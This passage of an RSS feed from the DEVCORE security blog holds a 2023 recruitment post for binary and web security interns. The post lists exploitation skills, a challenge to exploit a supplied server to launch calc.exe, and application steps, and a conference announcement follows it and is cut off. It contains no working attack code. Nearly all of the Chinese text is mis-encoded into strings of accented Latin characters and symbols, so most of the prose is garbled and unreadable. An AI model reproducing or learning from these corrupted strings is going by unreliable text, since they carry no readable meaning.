&lt;ul&gt;
  &lt;li&gt;Binary
‰ª•Á†îÁ©∂ÁÇ∫‰∏ªÔºåÂú®ËàáÂ∞éÂ∏´Á¢∫ÂÆöÁ†îÁ©∂Ê®ôÁöÑÂæåÔºåÂàÜÊûêÁõÆÊ®ôÊû∂Êßã„ÄÅÈÄ≤Ë°åÈÄÜÂêëÂ∑•Á®ãÊàñÁ®ãÂºèÁ¢ºÂØ©Êü•„ÄÇËóâÁî±ÈÄôÂÄãÈÅéÁ®ãË®ìÁ∑¥Ëá™Â∑±ÁöÑÊÄùË∑ØÔºåÊâæÂá∫ÂèØËÉΩÁöÑÊîªÊìäÈù¢ËàáÊΩõÂú®ÁöÑÂº±Èªû„ÄÇÂè¶Â§ñ‰πüÊúÉËÆìÂ§ßÂÆ∂ÂòóË©¶ÂàÜÊûêÂèäÂØ´ÈÅéÂæÄÊºèÊ¥ûÁöÑ ExploitÔºåÁêÜËß£ÈÅéÂéªÊºèÊ¥ûÈÉΩÂá∫ÁèæÂú®Âì™ÔºåÈ´îÈ©óÁúüÂØ¶‰∏ñÁïåÁöÑÊºèÊ¥ûÈÉΩÊòØÂ¶Ç‰ΩïÂà©Áî®„ÄÇ
    &lt;ul&gt;
      &lt;li&gt;ÊºèÊ¥ûÊåñÊéòÂèäÁ†îÁ©∂ 70 %&lt;/li&gt;
      &lt;li&gt;1-day ÈñãÁôº (Exploitation)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Web
‰∏ªË¶ÅÂÖßÂÆπÁÇ∫Á†îÁ©∂ÈÅéÂæÄÊºèÊ¥ûËàáËøëÂπ¥Â∏∏Ë¶ãÊñ∞ÂûãÊÖãÊºèÊ¥û„ÄÅÊîªÊìäÊâãÊ≥ïÔºåÈúÄË¶ÅË£Ω‰ΩúÊäïÂΩ±Áâá‰ªãÁ¥πÊàêÊûú‰∏¶Âª∫ÁΩÆÂèØ‰æõ‰ªñ‰∫∫ÈáçÁèæÂº±ÈªûÁöÑÊ®°Êì¨Ê∏¨Ë©¶Áí∞Â¢É (Lab)ÔºåÂè¶ÂèØËÉΩÈúÄË¶ÅÊí∞ÂØ´Êàñ‰øÆÊîπÂèØÂà©Áî®ÊîªÊìäÁ®ãÂºèÈÄ≤Ë°åÂº±ÈªûÈ©óË≠â„ÄÇ
    &lt;ul&gt;
      &lt;li&gt;ÊºèÊ¥ûÂèäÊîªÊìäÊâãÊ≥ïÁ†îÁ©∂ 70%&lt;/li&gt;
      &lt;li&gt;Âª∫ÁΩÆ Lab 30%&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ÂÖ¨Âè∏Âú∞Èªû&quot;&gt;ÂÖ¨Âè∏Âú∞Èªû&lt;/h3&gt;

&lt;p&gt;Âè∞ÂåóÂ∏ÇÊùæÂ±±ÂçÄÂÖ´Âæ∑Ë∑Ø‰∏âÊÆµ 32 Ëôü 13 Ê®ì&lt;/p&gt;

&lt;h3 id=&quot;ÂØ¶ÁøíÊôÇÈñì&quot;&gt;ÂØ¶ÁøíÊôÇÈñì&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;2023 Âπ¥ 3 ÊúàÈñãÂßãÂà∞ 2023 Âπ¥ 7 ÊúàÂ∫ïÔºåÂÖ± 5 ÂÄãÊúà„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÊØèÈÄ±Â∑•‰ΩúÂÖ©Â§©ÔºåÂ∑•‰ΩúÊôÇÈñìÁÇ∫ 10:00 ‚Äì 18:00
    &lt;ul&gt;
      &lt;li&gt;ÊØèÈÄ±Âõ∫ÂÆö‰∏ÄÂ§©‰∏ãÂçà 14:00 - 18:00 ÂøÖÈ†àÂà∞ÂÖ¨Âè∏Ë®éË´ñÈÄ≤Â∫¶
        &lt;ul&gt;
          &lt;li&gt;Â¶ÇÊûúÂ±Ö‰ΩèÈõôÂåóÂ§ñÂèØÂΩàÊÄßË™øÊï¥(‰ΩÜÈ†àÊØèÂÄãÁµÑÂà•Áµ±‰∏Ä)&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;ÂÖ∂È§òÊôÇÈñìÁöÜÁÇ∫ÈÅ†Á´Ø‰ΩúÊ•≠&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ÊãõÂãüÂ∞çË±°&quot;&gt;ÊãõÂãüÂ∞çË±°&lt;/h3&gt;

&lt;p&gt;Â§ßÂ∞àÈô¢Ê†°Â§ß‰∏âÔºàÂê´Ôºâ‰ª•‰∏äÂÖ∑Êúâ‰∏ÄÂÆöÁ®ãÂ∫¶Ë≥áÂÆâËÉåÊôØÁöÑÂ≠∏Áîü&lt;/p&gt;

&lt;h3 id=&quot;È†êË®àÊãõÊî∂ÂêçÈ°ç&quot;&gt;È†êË®àÊãõÊî∂ÂêçÈ°ç&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Binary ÁµÑÔºö2~3 ‰∫∫&lt;/li&gt;
  &lt;li&gt;Web ÁµÑÔºö2~3 ‰∫∫&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;Ëñ™Ë≥áÂæÖÈÅá&quot;&gt;Ëñ™Ë≥áÂæÖÈÅá&lt;/h3&gt;

&lt;p&gt;ÊØèÊúàÊñ∞Âè∞Âπ£ 16,000 ÂÖÉ&lt;/p&gt;

&lt;h2 id=&quot;ÊãõÂãüÊ¢ù‰ª∂Ë≥áÊ†ºËàáÊµÅÁ®ã&quot;&gt;ÊãõÂãüÊ¢ù‰ª∂Ë≥áÊ†ºËàáÊµÅÁ®ã&lt;/h2&gt;

&lt;h3 id=&quot;ÂØ¶ÁøíÊ¢ù‰ª∂Ë¶ÅÊ±Ç&quot;&gt;ÂØ¶ÁøíÊ¢ù‰ª∂Ë¶ÅÊ±Ç&lt;/h3&gt;

&lt;h4 id=&quot;binary&quot;&gt;Binary&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;Âü∫Êú¨ÈÄÜÂêëÂ∑•Á®ãÂèäÈô§ÈåØËÉΩÂäõ
    &lt;ul&gt;
      &lt;li&gt;ËÉΩÁúãÊáÇÁµÑÂêàË™ûË®Ä‰∏¶Áû≠Ëß£Âü∫Êú¨ Debugger ‰ΩøÁî®ÊäÄÂ∑ß&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Âü∫Êú¨ÊºèÊ¥ûÂà©Áî®ËÉΩÂäõ
    &lt;ul&gt;
      &lt;li&gt;È†àÁü•ÈÅì Stack overflow„ÄÅROP Á≠âÁõ∏ÈóúÂà©Áî®ÊäÄÂ∑ß&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Âü∫Êú¨ Scripting Language ÈñãÁôºËÉΩÂäõ
    &lt;ul&gt;
      &lt;li&gt;Python„ÄÅRuby&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôÂàÜÊûêÂ§ßÂûã Open Source Â∞àÊ°àËÉΩÂäõ
    &lt;ul&gt;
      &lt;li&gt;‰ª• C/C++ ÁÇ∫‰∏ª&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôÂü∫Á§é‰ΩúÊ•≠Á≥ªÁµ±Áü•Ë≠ò
    &lt;ul&gt;
      &lt;li&gt;‰æãÂ¶ÇÁü•ÈÅì Virtual Address Ëàá Physical Address ÁöÑÊ¶ÇÂøµ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Code Auditing
    &lt;ul&gt;
      &lt;li&gt;Áü•ÈÅìÊÄéÊ®£ÂØ´ÁöÑÁ®ãÂºèÁ¢ºÊúÉÊúâÂïèÈ°å
        &lt;ul&gt;
          &lt;li&gt;Buffer Overflow&lt;/li&gt;
          &lt;li&gt;Use After free&lt;/li&gt;
          &lt;li&gt;Race Condition&lt;/li&gt;
          &lt;li&gt;‚Ä¶&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôÁ†îÁ©∂ÁÜ±Ë™†ÔºåÁøíÊÖ£‰∫ÜËß£ÊäÄË°ìÊú¨Ë≥™&lt;/li&gt;
  &lt;li&gt;Âä†ÂàÜ‰ΩÜ&lt;strong&gt;ÈùûÂøÖË¶Å&lt;/strong&gt;Ê¢ù‰ª∂
    &lt;ul&gt;
      &lt;li&gt;CTF ÊØîË≥ΩÁ∂ìÈ©ó&lt;/li&gt;
      &lt;li&gt;pwnable.tw ÊàêÁ∏æ&lt;/li&gt;
      &lt;li&gt;Ê®ÇÊñºÂàÜ‰∫´ÊäÄË°ì
        &lt;ul&gt;
          &lt;li&gt;ÊúâÂÖ¨ÈñãÁöÑÊäÄË°ì blog/slide„ÄÅWrite-ups ÊàñÊòØÊºîË¨õ&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Á≤æÈÄö IDA Pro Êàñ Ghidra&lt;/li&gt;
      &lt;li&gt;ÊúâÂØ´ÈÅé 1-day Âà©Áî®Á®ãÂºè&lt;/li&gt;
      &lt;li&gt;ÂÖ∑ÂÇô‰∏ãÂàóÂÖ∂‰∏≠‰πã‰∏ÄÁ∂ìÈ©ó
        &lt;ul&gt;
          &lt;li&gt;Kernel Exploit&lt;/li&gt;
          &lt;li&gt;Windows Exploit&lt;/li&gt;
          &lt;li&gt;Browser Exploit&lt;/li&gt;
          &lt;li&gt;Bug Bounty&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;web&quot;&gt;Web&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;ÁÜüÊÇâ OWASP Web Top 10„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÁêÜËß£ PortSwigger Web Security Academy ‰∏≠ÊâÄÊúâÁöÑÂÆâÂÖ®Ë≠∞È°åÊàñÂ∑≤ÂÆåÊàêÊâÄÊúâ Lab„ÄÇ
    &lt;ul&gt;
      &lt;li&gt;ÂèÉËÄÉÈÄ£ÁµêÔºöhttps://portswigger.net/web-security/all-materials&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ÁêÜËß£Ë®àÁÆóÊ©üÁ∂≤Ë∑ØÁöÑÂü∫Êú¨Ê¶ÇÂøµ„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÁÜüÊÇâ Command Line Êìç‰ΩúÔºåÂåÖÂê´ Unix-like Âíå Windows ‰ΩúÊ•≠Á≥ªÁµ±ÁöÑÂ∏∏Ë¶ãÊàñÂÖßÂª∫Á≥ªÁµ±Êåá‰ª§Â∑•ÂÖ∑„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÁÜüÊÇâ‰ªª‰∏ÄÁ®ÆÁ∂≤È†ÅÁ®ãÂºèË™ûË®ÄÔºàÂ¶ÇÔºöPHP„ÄÅASP.NET„ÄÅJSPÔºâÔºåÂÖ∑ÂÇôÂèØ‰ª•Âª∫Á´ãÂÆåÊï¥Á∂≤È†ÅÊúçÂãôÁöÑËÉΩÂäõ„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÁÜüÊÇâ‰ªª‰∏ÄÁ®Æ Scripting LanguageÔºàÂ¶ÇÔºöShell Script„ÄÅPython„ÄÅRubyÔºâÔºå‰∏¶ËÉΩ‰ΩøÁî®ËÖ≥Êú¨Ëºî‰ª•Á†îÁ©∂„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôÈô§ÈåØËÉΩÂäõÔºåËÉΩÂñÑÁî® Debugger ËøΩËπ§Á®ãÂºèÊµÅÁ®ã„ÄÅËÉΩÈáçÁèæ‰∏¶Êî∂ÊñÇÂïèÈ°å„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôÂèØ‰ª•Âª∫ÁΩÆ„ÄÅË®≠ÂÆöÂ∏∏Ë¶ãÁ∂≤È†Å‰º∫ÊúçÂô®ÔºàÂ¶ÇÔºöNginx„ÄÅApacheÔºâÂèä‰ΩúÊ•≠Á≥ªÁµ±ÔºàÂ¶ÇÔºöLinuxÔºâÁöÑËÉΩÂäõ„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÂÖ∑ÂÇôËøΩÊ†πÁ©∂Êü¢ÁöÑÁ≤æÁ•û„ÄÇ&lt;/li&gt;
  &lt;li&gt;Âä†ÂàÜ‰ΩÜ&lt;strong&gt;ÈùûÂøÖË¶Å&lt;/strong&gt;Ê¢ù‰ª∂
    &lt;ul&gt;
      &lt;li&gt;ÊõæÁ∂ìÁç®Á´ãÊåñÊéòÈÅé 0-day ÊºèÊ¥û„ÄÇ&lt;/li&gt;
      &lt;li&gt;ÊõæÁ∂ìÁç®Á´ãÂàÜÊûêÈÅéÂ∑≤Áü•ÊºèÊ¥û‰∏¶ËÉΩÊí∞ÂØ´ 1-day exploit„ÄÇ&lt;/li&gt;
      &lt;li&gt;ÊõæÁ∂ìÊñº CTF ÊØîË≥Ω‰∏≠Êìî‰ªªÂá∫È°åËÄÖ‰∏¶Âª∫ÁΩÆÈÅéÈ°åÁõÆ„ÄÇ&lt;/li&gt;
      &lt;li&gt;ÊìÅÊúâ OSCP Ë≠âÁÖßÊàñÂêåÁ≠âËÉΩÂäõ‰πãË≠âÁÖß„ÄÇ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ÊáâÂæµÊµÅÁ®ã&quot;&gt;ÊáâÂæµÊµÅÁ®ã&lt;/h3&gt;

&lt;p&gt;Êú¨Ê¨°ÁîÑÈÅ∏‰∏ÄÂÖ±ÂàÜÁÇ∫‰∏âÂÄãÈöéÊÆµÔºö&lt;/p&gt;

&lt;h4 id=&quot;Á¨¨‰∏ÄÈöéÊÆµÊõ∏Èù¢ÂØ©Êü•&quot;&gt;Á¨¨‰∏ÄÈöéÊÆµÔºöÊõ∏Èù¢ÂØ©Êü•&lt;/h4&gt;

&lt;p&gt;Á¨¨‰∏ÄÈöéÊÆµÁÇ∫Êõ∏Èù¢ÂØ©Êü•ÔºåÊúÉÈúÄË¶ÅÂØ©Êü•‰∏ãÂàóÂÖ©ÂÄãÈ†ÖÁõÆ&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Êõ∏Èù¢ÂØ©Êü•&lt;/li&gt;
  &lt;li&gt;Á∞°Á≠îÈ°åÂèäÂØ¶‰ΩúÈ°åÁ≠îÊ°à
    &lt;ul&gt;
      &lt;li&gt;ÊáâÂæµ Binary ÂØ¶ÁøíÁîüÈúÄÈ°çÂ§ñÂú®Â±•Ê≠∑ÈôÑ‰∏ä‰∏ãËø∞ÂïèÈ°åÁ≠îÊ°à
        &lt;ul&gt;
          &lt;li&gt;Á∞°Á≠îÈ°å
            &lt;ul&gt;
              &lt;li&gt;Ë´ãÊèêÂá∫‰∏âÂÄãÔºå‰Ω†Âç∞Ë±°ÊúÄÊ∑±ÂàªÊàñÊÑüÂà∞ÊúâË∂£„ÄÅÊñºË•øÂÖÉ 2020 ~ 2023 Âπ¥ÈñìÂÖ¨ÈñãÁöÑÁúüÂØ¶ÊºèÊ¥ûÊàñÊîªÊìäÈèàÊ°à‰æãÔºå‰∏¶‰æùËá™Â∑±ÁöÑÁêÜËß£Á∞°Ëø∞Ë™™ÊòéÂêÑÂÄãÊºèÊ¥ûÁöÑÊàêÂõ†„ÄÅÂà©Áî®Ê¢ù‰ª∂ÂíåÂèØ‰ª•ÈÄ†ÊàêÁöÑÂΩ±Èüø„ÄÇ&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;ÂØ¶‰ΩúÈ°åÁõÆ
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;/assets/files/recruit/binary/2022_Intern_Challenge-2.zip&quot;&gt;È°åÁõÆÊ™îÊ°à&lt;/a&gt;
                &lt;ul&gt;
                  &lt;li&gt;ÁÇ∫‰∏ÄÂÄã‰∫íÂãïÂºèÁöÑ ServerÔºåÂèØÈÄèÈÅéÁ∂≤Ë∑ØÈÄ£Á∑öËàá‰πã‰∫íÂãï„ÄÇ&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;Ë´ãÂàÜÊûê‰∏äËø∞ÊâÄÊèê‰æõÁöÑ ServerÔºå‰∏¶Âà©Áî®ÂÖ∂‰∏≠ÁöÑÊºèÊ¥ûÂú® Windows 11 ‰∏äË∑≥Âá∫ calc.exe„ÄÇ
                &lt;ul&gt;
                  &lt;li&gt;ÊºèÊ¥ûÂèØËÉΩÊúâÂæàÂ§öÔºå‰∏ç‰∏ÄÂÆöÊØèÂÄãÈÉΩÂèØ‰ª•Âà©Áî®„ÄÇ&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;Ë´ãÂãôÂøÖÂØ´‰∏ãËß£È°åÈÅéÁ®ãÂèäÂ¶Ç‰ΩïÂéªÂàÜÊûêÈÄôÂÄã ServerÔºå‰∏¶‰∫§ write-upÔºåË´ãÁõ°‰Ω†ÊâÄËÉΩ‰æÜËß£È°åÔºåÂç≥‰ΩøÊúÄÂæåÊ≤íÊúâÊàêÂäüÔºå‰πüË´ãÂØ´‰∏ãÊÇ®ÊâÄÂòóË©¶ÈÅéÁöÑÊñπÊ≥ïÂèäÊÄùË∑ØÔºåÊú¨Ê∏¨È©óÂ∞áÊúÉ‰ª• write-up ÁÇ∫‰∏ªË¶Å‰æùÊìö„ÄÇ&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;ÊáâÂæµ Web ÂØ¶ÁøíÁîüÈúÄÈ°çÂ§ñÂú®Â±•Ê≠∑ÈôÑ‰∏ä‰∏ãËø∞ÂïèÈ°åÁ≠îÊ°à
        &lt;ul&gt;
          &lt;li&gt;Á∞°Á≠îÈ°å
            &lt;ul&gt;
              &lt;li&gt;Ë´ãÊèêÂá∫‰∏âÂÄãÔºå‰Ω†Âç∞Ë±°ÊúÄÊ∑±ÂàªÊàñÊÑüÂà∞ÊúâË∂£„ÄÅÊñºË•øÂÖÉ 2020 ~ 2023 Âπ¥ÈñìÂÖ¨ÈñãÁöÑÁúüÂØ¶ÊºèÊ¥ûÊàñÊîªÊìäÈèàÊ°à‰æãÔºå‰∏¶‰æùËá™Â∑±ÁöÑÁêÜËß£Á∞°Ëø∞Ë™™ÊòéÂêÑÂÄãÊºèÊ¥ûÁöÑÊàêÂõ†„ÄÅÂà©Áî®Ê¢ù‰ª∂ÂíåÂèØ‰ª•ÈÄ†ÊàêÁöÑÂΩ±Èüø„ÄÇ&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Êú¨ÈöéÊÆµÊî∂‰ª∂Êà™Ê≠¢ÊôÇÈñìÁÇ∫ &lt;strong&gt;2023/2/3 10:00&lt;/strong&gt;ÔºåÊàëÂÄëÊúÉÊ†πÊìöÊÇ®ÁöÑÂ±•Ê≠∑ÂèäÈ°åÁõÆÊâÄÂõûÁ≠îÁöÑÂÖßÂÆπ‰æÜÊ±∫ÂÆöÊòØÂê¶ÊúâÈÄöÈÅéÁ¨¨‰∏ÄÈöéÊÆµÔºåÊàëÂÄëÊúÉÂú®‰∏ÉÂÄã&lt;strong&gt;Â∑•‰ΩúÂ§©&lt;/strong&gt;ÂÖßÂõûË¶Ü„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;Á¨¨‰∫åÈöéÊÆµËÉΩÂäõÊ∏¨È©ó&quot;&gt;Á¨¨‰∫åÈöéÊÆµÔºöËÉΩÂäõÊ∏¨È©ó&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;Binary
    &lt;ul&gt;
      &lt;li&gt;ÁÑ°&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Web
    &lt;ul&gt;
      &lt;li&gt;Á¨¨‰∫åÈöéÊÆµÊúÉÊ†πÊìöÊÇ®ÁöÑÂ±•Ê≠∑ÊàñÊòØ‰ªª‰ΩïÂèØË≠âÊòéÂÖ∑ÂÇôË∂≥Â§† Web Êª≤ÈÄèÁõ∏ÈóúÊäÄËÉΩÁöÑË≥áÊñô‰æÜÊ±∫ÂÆöÊòØÂê¶ÈúÄË¶ÅÂè¶Â§ñÂÅöÈ°åÁõÆÔºåÂ¶ÇÊûúÊú™ÈÅîÊ®ôÊ∫ñÊúÉÂè¶Â§ñÊ∫ñÂÇôÈù∂Ê©üÊ∏¨È©óÔºåÂæÖÊàëÂÄëÊî∂Âà∞Ëß£È°åÈÅéÁ®ãÂæåÔºåÂ∞áÊúÉÊ†πÊìöÊÇ®ÁöÑÁãÄÊ≥ÅÊ±∫ÂÆöÊòØÂê¶ÂèØ‰ª•ÈÄ≤ÂÖ•Á¨¨‰∏âÈöéÊÆµ„ÄÇ&lt;/li&gt;
      &lt;li&gt;Êú¨ÈöéÊÆµÊî∂‰ª∂ÊôÇÈñìÁÇ∫ &lt;strong&gt;2023/2/5 23:59&lt;/strong&gt;ÔºåÂª∫Ë≠∞ÊèêÊó©ÈÅû‰∫§Â±•Ê≠∑ÔºåÂèØ‰ª•ÊèêÂâç‰ΩúÁ≠î„ÄÇ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;Á¨¨‰∏âÈöéÊÆµÈù¢Ë©¶&quot;&gt;Á¨¨‰∏âÈöéÊÆµÔºöÈù¢Ë©¶&lt;/h4&gt;
&lt;p&gt;Ê≠§ÈöéÊÆµÁÇ∫ 1~2 Â∞èÊôÇÁöÑÈù¢Ë©¶ÔºåÊúÉÊúâ 2~3 ‰ΩçË≥áÊ∑±Â§•‰º¥ÂèÉËàáÔºåË©ï‰º∞ÊÇ®ÊòØÂê¶ÂÖ∑ÂÇôÊú¨Ê¨°ÂØ¶ÁøíÊâÄÈúÄÁöÑÊäÄË°ìËÉΩÂäõËàá‰∫∫Ê†ºÁâπË≥™„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;Â†±ÂêçÊñπÂºè&quot;&gt;Â†±ÂêçÊñπÂºè&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Ë´ãÂ∞áÊÇ®ÁöÑ&lt;strong&gt;Â±•Ê≠∑&lt;/strong&gt;Âèä&lt;strong&gt;È°åÁõÆÁ≠îÊ°à&lt;/strong&gt;‰ª• PDF Ê†ºÂºèÂØÑÂà∞ recruiting_intern@devco.re
    &lt;ul&gt;
      &lt;li&gt;Â±•Ê≠∑Ê†ºÂºèË´ãÂèÉËÄÉÁØÑ‰æãÁ§∫ÊÑèÔºà&lt;a href=&quot;/assets/files/recruit/Resume_Example.docx&quot;&gt;DOCX&lt;/a&gt;„ÄÅ&lt;a href=&quot;/assets/files/recruit/Resume_Example.pages&quot;&gt;PAGES&lt;/a&gt;„ÄÅ&lt;a href=&quot;/assets/files/recruit/Resume_Example.pdf&quot;&gt;PDF&lt;/a&gt;Ôºâ‰∏¶ËΩâÊàê PDF„ÄÇËã•ÊÇ®ÊúâËá™‰ø°Ôºå‰πüÂèØ‰ª•Ëá™Áî±ÁôºÊèÆÊúÄËÉΩÂëàÁèæÊÇ®ËÉΩÂäõÁöÑÂ±•Ê≠∑„ÄÇ&lt;/li&gt;
      &lt;li&gt;Ë´ãÊñº &lt;strong&gt;2023/02/03 10:00&lt;/strong&gt; ÂâçÂØÑÂá∫ÔºàÂ¶ÇÊûúÂêçÈ°çÂ∑≤ÊªøÂâáË¶ñÊÉÖÊ≥ÅÊèêÊó©ÁµêÊùüÔºâ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;‰ø°‰ª∂Ê®ôÈ°åÊ†ºÂºèÔºö[ÊáâÂæµ] ËÅ∑‰Ωç ÊÇ®ÁöÑÂßìÂêçÔºàÁØÑ‰æãÔºö[ÊáâÂæµ] Web ÁµÑÂØ¶ÁøíÁîü ÁéãÂ∞èÁæéÔºâ&lt;/li&gt;
  &lt;li&gt;Â±•Ê≠∑ÂÖßÂÆπË´ãÂãôÂøÖÊéßÂà∂Âú®‰∏âÈ†Å‰ª•ÂÖßÔºåËá≥Â∞ëÈúÄÂåÖÂê´‰ª•‰∏ãÂÖßÂÆπÔºö
    &lt;ul&gt;
      &lt;li&gt;Âü∫Êú¨Ë≥áÊñô&lt;/li&gt;
      &lt;li&gt;Â≠∏Ê≠∑&lt;/li&gt;
      &lt;li&gt;ÂØ¶ÁøíÁ∂ìÊ≠∑&lt;/li&gt;
      &lt;li&gt;Á§æÁæ§Ê¥ªÂãïÁ∂ìÊ≠∑&lt;/li&gt;
      &lt;li&gt;ÁâπÊÆä‰∫ãËπü&lt;/li&gt;
      &lt;li&gt;ÈÅéÂéªÂ∞çÊñºË≥áÂÆâÁöÑÁõ∏ÈóúÁ†îÁ©∂&lt;/li&gt;
      &lt;li&gt;Â∞çÊñºÈÄô‰ªΩÂØ¶ÁøíÁöÑÊúüÊúõ&lt;/li&gt;
      &lt;li&gt;MBTI ËÅ∑Ê•≠ÊÄßÊ†ºÊ∏¨Ë©¶ÁµêÊûúÔºà&lt;a href=&quot;https://www.apesk.com/mbti/dati_tw.asp&quot;&gt;Ê∏¨Ë©¶Á∂≤È†Å&lt;/a&gt;Ôºâ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ëã•ÊúâÊáâÂæµÁõ∏ÈóúÂïèÈ°åÔºåË´ã‰∏ÄÂæã‰ΩøÁî® Email ËÅØÁπ´ÔºåÂ¶ÇÈÄ†ÊàêÊÇ®ÁöÑ‰∏ç‰æøË´ãË¶ãË´íÔºåÊàëÂÄëÊÑüË¨ùÊÇ®ÁöÑ‰æÜ‰ø°Ôºå‰∏¶ÊúüÂæÖÊÇ®ÁöÑÂä†ÂÖ•ÔºÅ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2023/01/14/3rd-internship-program-recruit/</link>
                <guid>https://devco.re/blog/2023/01/14/3rd-internship-program-recruit</guid>
                <pubDate>Sat, 14 Jan 2023 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE CONFERENCE 2023 Âç≥Êó•Ëµ∑ÈñãÊîæÂ†±Âêç</title>
                <description>&lt;style type=&quot;text/css&quot;&gt;
    table {
        width: 100%;
        overflow: auto;
        word-break: normal;
        word-break: keep-all;
        font-size: 0.7em;
    }

    table th {
        font-weight: bold
    }

    table th,
    table td {
        padding: 5px 11px;
        border: 1px solid #ddd;
    }

    table tr {
        background-color: #fff;
        border-top: 1px solid #ccc;
    }

    table tr:nth-child(2n) {
        background-color: #f8f8f8;
    }
    .center-image {
        margin: 0 auto;
        display: block;
    }
&lt;/style&gt;

&lt;p&gt;DEVCORE ÂæàÈ´òËààÂú∞ÂÆ£‰ΩàÔºåÁ¥îÊîªÊìäÂ∞éÂêëÁöÑÂ∞àÊ•≠ÊäÄË°ìÁ†îË®éÊúÉ DEVCORE CONFERENCEÔºåÂú®ÊöåÈÅï‰∏âÂπ¥ÂæåÔºåÂ∞áÊñº 3 Êúà 10 Êó•Ëá≥ Ôºì Êúà 11 Êó•ÊñºÂè∞Âåó TICC ÂúãÈöõÊúÉË≠∞‰∏≠ÂøÉÂÜçÊ¨°ÁõõÂ§ßËàâË°åÔºåÂç≥Êó•Ëµ∑ÈñãÊîæÂ†±ÂêçÔºåÂêåÊôÇÁÇ∫ÊÖ∂Á•ù DEVCORE ÂâµÁ´ãÂçÅÈÄ±Âπ¥ÔºåÈô§‰∫ÜÂéüÊúâÁöÑÈß≠ÂÆ¢ÊäÄË°ìË≠∞Á®ãÂ§ñÔºåÁâπÂà•Âä†Èñã‰ºÅÊ•≠Â†¥„ÄÇ&lt;/p&gt;

&lt;p&gt;„ÄåDEVCORE ÂçÅÂπ¥‰æÜÊåÅÁ∫åÊèê‰æõ‰ºÅÊ•≠È†ÇÂ∞ñÁöÑ‰∏ªÂãïÂºèË≥áÂÆâÊúçÂãôÔºåÂæàÈ´òËààÁúãÂà∞Ë≥áÂÆâËàáÁ¥ÖÈöäÊºîÁ∑¥Êó•Êº∏ÂèóÂà∞Âè∞ÁÅ£Ê•≠ÁïåËàáÊîøÂ∫úÂñÆ‰ΩçÈáçË¶ñÔºåÂ∏åÊúõÂ∞áÊàëÂÄë‰∏ÄË∑ØÁ¥ØÁ©çÁöÑÁ∂ìÈ©óËàáËÉΩÈáèÔºå‰∏çËóèÁßÅÂú∞ÂàÜ‰∫´Áµ¶ÊâÄÊúâÂøóÂêåÈÅìÂêàÁöÑÂ§•‰º¥ÔºåÂÖ±ÂêåÁÇ∫Âè∞ÁÅ£Ë≥áÂÆâÁî¢Ê•≠ÁöÑÁôºÂ±ï‰∏¶ËÇ©‰ΩúÊà∞„ÄÇ„ÄçÂü∑Ë°åÈï∑Êö®ÂÖ±ÂêåÂâµËæ¶‰∫∫ÁøÅÊµ©Ê≠£ÔºàAllenÔºâË°®Á§∫„ÄÇ&lt;/p&gt;

